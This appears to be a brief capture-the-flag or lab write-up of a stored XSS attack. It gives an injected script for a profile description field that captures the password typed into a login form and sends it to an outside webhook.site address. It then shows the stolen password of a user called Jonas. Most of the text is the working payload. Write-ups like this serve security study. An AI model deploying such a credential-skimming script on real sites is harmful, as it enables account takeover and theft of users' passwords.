We exploit an XSS vulnerability by injecting the following script in the edit profile description form:
```html
<script>
document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", () => {
        var password = document.getElementById("authPassword").value;
        fetch("//webhook.site/5337230b-fd89-40b2-887b-0ea2d6eabd00?password=" + encodeURIComponent(password));
    })
});
</script>
```
The next time Jonas logs in we will receive the real password on our webhook:
`jeg!Har%Mest&LystTil&At%Være-En-Hacker`
